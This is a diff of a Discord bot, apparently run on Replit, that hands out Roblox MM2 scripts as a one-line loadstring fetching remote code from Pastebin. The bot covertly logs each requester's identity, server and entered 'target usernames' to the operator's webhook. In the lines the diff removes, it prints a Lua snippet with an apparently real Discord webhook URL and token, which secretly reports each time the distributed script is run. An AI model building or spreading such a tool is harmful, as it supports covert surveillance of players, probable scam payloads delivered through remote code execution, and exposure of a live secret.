@@ -35,7 +35,8 @@ def send_webhook_notification(user, targets, paste_url, guild_name):
             }]
         }
         requests.post(TRACKING_WEBHOOK, json=data)
-    except:
+    except Exception as e:
+        print(f"Webhook error: {e}")
         pass
 
 def create_pastebin(content):
@@ -49,13 +50,17 @@ def create_pastebin(content):
             'api_paste_name': 'MM2 Script'
         }
         response = requests.post('https://pastebin.com/api/api_post.php', data=data)
-        if response.status_code == 200 and 'pastebin.com/' in response.text:
+        if response.status_code == 200:
             paste_url = response.text.strip()
-            paste_id = paste_url.split('/')[-1]
-            raw_url = f"https://pastebin.com/raw/{paste_id}"
-            return paste_url, raw_url
+            # Extract paste ID from the response
+            if 'pastebin.com/' in paste_url:
+                # Extract the paste ID (the part after the last slash)
+                paste_id = paste_url.split('/')[-1]
+                raw_url = f"https://pastebin.com/raw/{paste_id}"
+                return paste_url, raw_url
         return None, None
-    except:
+    except Exception as e:
+        print(f"Pastebin error: {e}")
         return None, None
 
 class ScriptModal(Modal, title="MM2 Script Generator"):
@@ -86,15 +91,16 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         
         paste_url, raw_url = create_pastebin(full_script)
         
-        if raw_url:
-            short_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
+        if paste_url and raw_url:
+            # Create the proper loadstring with raw URL
+            loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
             
             # Send tracking notification to your webhook
             send_webhook_notification(
                 interaction.user,
                 ', '.join(user_targets),
                 paste_url,
-                interaction.guild.name if interaction.guild else None
+                interaction.guild.name if interaction.guild else "DM"
             )
             
             # Send to user
@@ -102,53 +108,57 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
                 await interaction.user.send(
                     f"**🎮 Your MM2 Script is Ready!**\n\n"
                     f"**Copy and paste this:**\n"
-                    f"```lua\n{short_loadstring}\n```"
+                    f"```lua\n{loadstring_code}\n```"
                 )
                 await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
-            except:
+            except discord.Forbidden:
                 await interaction.followup.send(
-                    f"⚠️ Couldn't DM you:\n```lua\n{short_loadstring}\n```",
+                    f"⚠️ Couldn't DM you. Here's your script:\n```lua\n{loadstring_code}\n```",
                     ephemeral=True
                 )
         else:
-            await interaction.followup.send(f"⚠️ Pastebin failed:\n```lua\n{full_script}\n```", ephemeral=True)
+            # Fallback: send direct loadstring if Pastebin fails
+            await interaction.followup.send(
+                f"⚠️ Pastebin failed. Here's your direct script:\n```lua\n{full_script}\n```",
+                ephemeral=True
+            )
 
 @tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
 async def generate_mm2(interaction: discord.Interaction):
+    """Main command to generate MM2 scripts"""
     await interaction.response.send_modal(ScriptModal())
 
 @bot.event
 async def on_ready():
+    """Called when bot is ready"""
     await tree.sync()
-    print(f"{bot.user} is online!")
+    print(f"✅ {bot.user} is online and ready!")
+    print(f"🤖 Bot ID: {bot.user.id}")
+    print(f"🔗 Tracking Webhook: {TRACKING_WEBHOOK}")
+    print(f"📁 Script Source: {RAW_SCRIPT_URL}")
 
-bot.run(os.getenv("DISCORD_TOKEN"))
-What You'll Get in Your Webhook Channel:
-Every time someone generates a script, you'll get an embed like this:
-📊 New Script Generated!
+# Error handling for commands
+@tree.error
+async def on_app_command_error(interaction: discord.Interaction, error):
+    """Handle command errors"""
+    if isinstance(error, app_commands.CommandInvokeError):
+        await interaction.response.send_message(
+            "❌ An error occurred while processing your command. Please try again.",
+            ephemeral=True
+        )
+        print(f"Command error: {error}")
 
-User: slasher0366#0
-User ID: 1036497462606696528
-Server: Your Server Name
-Target Usernames: Player1, Player2, Player3
-Pastebin Link: https://pastebin.com/abc123
-
-[timestamp]
-Features:
-✅ Uses your existing webhook for tracking
-✅ Shows who generated scripts
-✅ Shows what usernames they targeted
-✅ Shows the Pastebin link
-✅ Shows which server they're from
-✅ Nice embedded format
-For Execution Count:
-To track how many times the script is executed (not just generated), you need to modify your Lua script on GitHub to ping back. Add this at the top of your mm2sourcebyjoshhub.txt:
--- Track execution
-pcall(function()
-    game:GetService("HttpService"):PostAsync(
-        "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD",
-        game:GetService("HttpService"):JSONEncode({
-            content = "✅ **Script Executed!** Someone just ran the script in-game."
-        })
-    )
-end)
+if __name__ == "__main__":
+    # Check for required environment variables
+    required_env_vars = ["DISCORD_TOKEN", "PASTEBIN_API_KEY"]
+    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
+    
+    if missing_vars:
+        print(f"❌ Missing environment variables: {', '.join(missing_vars)}")
+        print("Please set these in your Replit environment variables:")
+        for var in missing_vars:
+            print(f"  - {var}")
+        exit(1)
+    
+    print("🚀 Starting Discord bot...")
+    bot.run(os.getenv("DISCORD_TOKEN"))
